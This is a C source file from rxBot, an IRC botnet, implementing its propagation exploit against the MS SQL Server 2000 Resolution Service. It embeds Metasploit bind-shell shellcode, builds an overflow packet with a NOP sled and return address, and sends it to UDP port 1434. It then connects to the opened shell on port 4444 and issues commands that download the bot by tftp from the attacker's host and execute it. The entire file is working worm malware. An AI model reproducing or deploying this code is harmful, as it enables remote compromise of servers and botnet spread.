/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MSSQL

bool MSSQLResolution(EXINFO exinfo) {
	/* win32_bind -  EXITFUNC=process LPORT=4444 Size=342 Encoder=PexFnstenvMov http://metasploit.com */
	unsigned char scode[] =
		"\x6a\x50\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x97\x27\xc8"
		"\x3e\x83\xeb\xfc\xe2\xf4\x6b\x4d\x23\x73\x7f\xde\x37\xc1\x68\x47"
		"\x43\x52\xb3\x03\x43\x7b\xab\xac\xb4\x3b\xef\x26\x27\xb5\xd8\x3f"
		"\x43\x61\xb7\x26\x23\x77\x1c\x13\x43\x3f\x79\x16\x08\xa7\x3b\xa3"
		"\x08\x4a\x90\xe6\x02\x33\x96\xe5\x23\xca\xac\x73\xec\x16\xe2\xc2"
		"\x43\x61\xb3\x26\x23\x58\x1c\x2b\x83\xb5\xc8\x3b\xc9\xd5\x94\x0b"
		"\x43\xb7\xfb\x03\xd4\x5f\x54\x16\x13\x5a\x1c\x64\xf8\xb5\xd7\x2b"
		"\x43\x4e\x8b\x8a\x43\x7e\x9f\x79\xa0\xb0\xd9\x29\x24\x6e\x68\xf1"
		"\xae\x6d\xf1\x4f\xfb\x0c\xff\x50\xbb\x0c\xc8\x73\x37\xee\xff\xec"
		"\x25\xc2\xac\x77\x37\xe8\xc8\xae\x2d\x58\x16\xca\xc0\x3c\xc2\x4d"
		"\xca\xc1\x47\x4f\x11\x37\x62\x8a\x9f\xc1\x41\x74\x9b\x6d\xc4\x74"
		"\x8b\x6d\xd4\x74\x37\xee\xf1\x4f\xd9\x62\xf1\x74\x41\xdf\x02\x4f"
		"\x6c\x24\xe7\xe0\x9f\xc1\x41\x4d\xd8\x6f\xc2\xd8\x18\x56\x33\x8a"
		"\xe6\xd7\xc0\xd8\x1e\x6d\xc2\xd8\x18\x56\x72\x6e\x4e\x77\xc0\xd8"
		"\x1e\x6e\xc3\x73\x9d\xc1\x47\xb4\xa0\xd9\xee\xe1\xb1\x69\x68\xf1"
		"\x9d\xc1\x47\x41\xa2\x5a\xf1\x4f\xab\x53\x1e\xc2\xa2\x6e\xce\x0e"
		"\x04\xb7\x70\x4d\x8c\xb7\x75\x16\x08\xcd\x3d\xd9\x8a\x13\x69\x65"
		"\xe4\xad\x1a\x5d\xf0\x95\x3c\x8c\xa0\x4c\x69\x94\xde\xc1\xe2\x63"
		"\x37\xe8\xcc\x70\x9a\x6f\xc6\x76\xa2\x3f\xc6\x76\x9d\x6f\x68\xf7"
		"\xa0\x93\x4e\x22\x06\x6d\x68\xf1\xa2\xc1\x68\x10\x37\xee\x1c\x70"
		"\x34\xbd\x53\x43\x37\xe8\xc5\xd8\x18\x56\xe9\xff\x2a\x4d\xc4\xd8"
		"\x1e\xc1\x47\x27\xc8\x3e";


	unsigned long targets[]={
		0x42b48774 /*MSQL 2000 / MSDE*/
	};
	unsigned short sqlport = 1434;

	char *request=(char*)malloc(1+800+5+1+sizeof(scode));

	//\x68:888 => push dword 0x3838383a
	memcpy(request+0, "\x04", 1);
	memset(request+1, 0x90, 800);
	memcpy(request+801, "\x68:888", 5);
	memcpy(request+806, "\x90", 1);
	memcpy(request+807, scode, sizeof(scode));

	//return address of jmp esp
	memcpy(request+97, (char*)&targets[0], 4);

	//takes us right here, with 8 bytes available
	memcpy(request+101, "\xeb\x69\xeb\x69", 8);

	//write to thread storage space ala msrpc
	memcpy(request+109, "\xcc\xe0\xff\x7f", 4); //0x7ffde0cc
	memcpy(request+113, "\xcc\xe0\xff\x7f", 4); 

	//the payload starts here
	memset(request+117, 0x90, 100);
	memcpy(request+217, scode, sizeof(scode));

	SOCKET s;
	if ((s=fsocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == INVALID_SOCKET) return false;

	SOCKADDR_IN ssin;
	ssin.sin_family = AF_INET;
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
	ssin.sin_port = fhtons((unsigned short)sqlport);

	if (fconnect(s, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) return false;
	if (fsend(s, request, strlen(request), 0) == SOCKET_ERROR) return false;
	
	fclosesocket(s);

	//automatically restart sql server - thanks SK!

	s=fsocket(AF_INET, SOCK_STREAM, 0);
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
	ssin.sin_port = fhtons((unsigned short)4444);

	if(fconnect(s, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) return false;

	char cmd_buff[400];
	_snprintf(cmd_buff, sizeof(cmd_buff),
		"net start sqlserveragent & "
		"tftp -i %s GET %s & "
		"%s",
		exinfo.myip, filename, filename);

	if(fsend(s,(char*)cmd_buff, strlen(cmd_buff),0) == SOCKET_ERROR) return false;

	fclosesocket(s);

	return (AddEx(exinfo,true));
}
#endif